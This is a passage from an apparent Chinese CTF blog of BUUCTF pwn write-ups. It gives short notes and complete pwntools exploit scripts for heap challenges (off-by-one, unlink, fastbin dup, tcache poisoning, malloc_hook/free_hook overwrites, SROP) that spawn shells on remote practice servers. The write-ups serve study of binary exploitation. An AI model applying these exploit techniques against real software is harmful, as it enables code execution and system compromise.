class="string">b&quot;\x00&quot;</span>*<span class="number">9</span>+p64(rax))</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr - <span class="number">0x118</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr -<span class="number">0x118</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span>+p64(sigreturn_addr)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>这题最后有个手法比较神奇，然后中间涉及off_one_byte之后 如何利用，值得记录<br>add:可以申请任意大小<br>write:堆内写入，有1字节溢出<br>drop: 删除 会归零<br>show：输出</p>
<p>总体上没有直接的uaf 但是这个结构明显是off-one-byte<br>我们能最大申请的是0x100 但是如果要覆盖后面的size ，我们得申请0x98或者0x88 因为当我们输入大于0x101的数会被强制变成10<br>流程如下:<br>add(0x88) #0<br>add(0x100) #1<br>add(0x100) #2<br>add(0x30) #3 做边界<br>write(1,b’a’*0xf0+p64(0x100)+p64(0x11)) 伪造prev_size<br>delete(1)<br>write(0,b’a’<em>0x88+b’\x00’,1)<br>add(0x80) #1<br>add(0x10) #4<br>add(0x10) #5<br>其实5不需要<br>delete(1)<br>delete(2)<br>这时候已经发生向前合并 创造一个2和1的大空间<br>add(0x88) #1<br>这时候在4的位置 会有fd和bk指针 用于泄露libc<br>找到malloc_hook - 0x23 我们分配到那个位置 作为chunk起点<br>add(0x60) #2<br>add(0x60) #6<br>用来打fastbindup<br>delete(6)<br>delete(2)<br>write(4,p64(target))<br>add(0x60) #2<br>add(0x60) #6 ,会控制到malloc_hook-0x13<br>write(6,b’a’</em>(0x13-8)+p64(one_gadget)+p64(realloc))<br>print(one_gadget)<br>add(1)<br>p.interactive()</p>
<p>这里我们覆盖了realloc_hook为one_gadget<br>malloc_hook为realloc<br>因为直接one_gadget全不通 就中途经过一个函数 调整栈状态看看能否打通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26051</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,data,poison = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> poison :</span><br><span class="line">        lenth = <span class="built_in">len</span>(data)-<span class="number">1</span>+<span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lenth = <span class="built_in">len</span>(data)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(lenth).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">b&#x27;Note system&#x27;</span>).rstrip(<span class="string">b&#x27;Note system&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#3</span></span><br><span class="line">write(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">write(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#5</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#1</span></span><br><span class="line">leak = u64(show(<span class="number">4</span>)[:<span class="number">8</span>])</span><br><span class="line">libc_base = leak - (<span class="number">0x70423abc4b78</span>-<span class="number">0x70423a800000</span>)</span><br><span class="line">malloc_hook = libc_base+(<span class="number">0x7710c1bc4b10</span>- <span class="number">0x7710c1800000</span>)</span><br><span class="line">target = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">realloc = libc_base + <span class="number">0x00000000000846c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">4</span>,p64(target))</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6 ,会控制到malloc_hook-0x13</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc))</span><br><span class="line"><span class="built_in">print</span>(one_gadget)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><p>这题和之前sekaictf遇到的一个非常相似,但是sekaictf那个是覆盖一个超大的size生成unsortedbin以泄露libc 这题我们无法申请大的chunk 只能malloc(0x18) 和 malloc(0x38) 要产生unsortedbin非常麻烦 不过幸好pie关闭 可以直接覆盖指针到got表去泄露。</p>
<p>同时tcachebin 的检查更少 覆盖size后free操作对下一块没任何检查 这使得利用更加简便</p>
<ol>
<li><p>add : 可以申请0x18与0x38 大小，先会申请一个管理chunk malloc(0x10)</p>
</li>
<li><p>edit : 可以多一个字节编辑 这使得size覆盖得以实现</p>
</li>
<li><p>show: 打印 用的是%s </p>
</li>
<li><p>delete: 先删除数据chunk 再删管理chunk</p>
</li>
</ol>
<p>由于前面这种重叠涉及多次 我就不细说思路怎么来的了 直接上流程:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment">#1</span></span><br></pre></td></tr></table></figure>



<p>这就直接产生重叠了 可以看到tcache要构造重叠非常轻松</p>
<p>然后就是覆盖指针 泄露libc 覆盖got表</p>
<p>全部payload </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./npuctf_2020_easyheap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26825</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</span><br><span class="line">                size = <span class="number">24</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">                size = <span class="number">56</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap(0x10 or 0x20 only) :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">free_libc = u64(show(<span class="number">1</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = free_libc - <span class="number">0x0000000000097950</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_libc = libc_base + <span class="number">0x000000000004f440</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system_libc))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining bamboobox"></a>hitcontraining bamboobox</h2><p>这题和前面有一题几乎一致！ 见前文的stkof </p>
<p>不过当我写完这题发现main里面有个malloc申请的存储函数指针的堆块我压根没用过</p>
<p>网上搜到说是可以用house of force分配到那里</p>
<p>见<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114291792">[BUUCTF]PWN——hitcontraining_bamboobox（House of force+unlink）_bamboobox pwn-CSDN博客</a></p>
<h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h2><p>这题和之前有个特别像</p>
<p>我就不细说了，主要是我把data段的binsh漏了导致多了一步泄露heap地址 虽然写出来了 但是但凡多点限制我可能就寄了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28944</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input size:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Please input content:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input list index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input list index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content is \&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(<span class="string">b&#x27;\&#x27;&#x27;</span>).rstrip(<span class="string">b&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">leak = u64(dump(<span class="number">1</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">binsh = leak+<span class="number">0x20</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(binsh)+p64(<span class="number">0x4007a0</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2025/09/04/buuctf/joker.png" alt="joker" loading="lazy"></p>
<h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><p>稍微有点难度的题</p>
<p>name 输入%3$p 泄露write + 16 , %11$p 泄露main+28</p>
<p>add 申请任意大小 但是大于0x80  即不可使用fastbin</p>
<p>note数组存储chunk信息 前8字节存储chunk指针 后8字节存储size信息</p>
<p>然后输入size大小</p>
<p>delete 指针会归零</p>
<p>edit 编辑 有off_one_byte 且不是off_by_null</p>
<p>思路:</p>
<p>覆盖prev_size ，到上一个chunk的fake chunk  打unlink控制指针 为 -0x18 ，但是开启了full relro 程序里有个可以申请fastbin的方法 ，unlink覆盖了key后打fastbin dup 到malloc hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./axb_2019_heap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26685</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,data</span>):</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Enter a size:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Enter the content: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Enter an index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        menu(<span class="number">4</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Enter an index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Enter the content:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p,%3$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello, &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;,&#x27;</span>,<span class="literal">True</span>).decode(<span class="string">&#x27;l1&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">text_base = leak-(<span class="number">0x5f9d77e01186</span>-<span class="number">0x5f9d77e00000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(text_base))</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline().decode(<span class="string">&#x27;l1&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = leak-(<span class="number">0x7274e28f72c0</span>-<span class="number">0x7274e2800000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x81</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x82</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x81</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x82</span>-<span class="number">8</span>))</span><br><span class="line">ptr = text_base+<span class="number">0x202060</span></span><br><span class="line">key = text_base+<span class="number">0x202040</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">system_libc = libc_base + <span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">0</span>,(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(key)+p64(<span class="number">7</span>)).ljust(<span class="number">0x9a</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">43</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">malloc_hook = libc_base + (<span class="number">0x7e4bf2fc4b10</span>-<span class="number">0x7e4bf2c00000</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x59</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line"><span class="comment"># 0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">memalign = libc_base +<span class="number">0x0000000000084aa0</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">16</span>)+p64(one_gadget)*<span class="number">2</span>+p64(memalign)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">70</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h2><p>add功能 申请0x18的管理chunk 申请任意大小 size存储在管理chunk +8 然后输入name 存储在chunk中 然后输入compary call (call存储在管理数组中 而不存储在堆中)</p>
<p>有管理数组 一个chunk用3*8字节管理 </p>
<p>0x0 : ptr  8</p>
<p>0x8: size 4</p>
<p>0xC: call 0xC 最后会被强制赋值空字节</p>
<p>show 输出name 和 phone</p>
<p>call 会free掉chunk 但是没有归零</p>
<p>libc2.27 的 tcachebin暂时没有引入key进行double free检查</p>
<p>甚至不检查取出的tcache的size字段 同时没有申请16对齐的检查</p>
<p>总体上可以说非常随意</p>
<p>先free unsortedbin 泄露libc地址</p>
<p>然后打tcachebin到 __free_hook 劫持为system</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">└─<span class="comment"># cat exp.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_es_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25485</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input the size of compary\&#x27;s name&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;please input name:&#x27;</span>,name)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;compary call&#x27;</span>,<span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        menu(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">leak = show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x746a8cfebca0</span>-<span class="number">0x746a8cc00000</span>)</span><br><span class="line"><span class="comment">#00000000003ed8e8 __free_hook</span></span><br><span class="line"><span class="comment">#000000000004f440 system</span></span><br><span class="line">free_hook = libc_base+<span class="number">0x00000000003ed8e8</span></span><br><span class="line">system = libc_base+<span class="number">0x000000000004f440</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="ZCTF-2016-note2"><a href="#ZCTF-2016-note2" class="headerlink" title="ZCTF_2016_note2"></a>ZCTF_2016_note2</h2><p>这题的漏洞是整数溢出 这也提醒我们即使在很复杂的题也不要忘记最基础的几种漏洞</p>
<p>另外 这题我模仿了高手的python exploit模板</p>
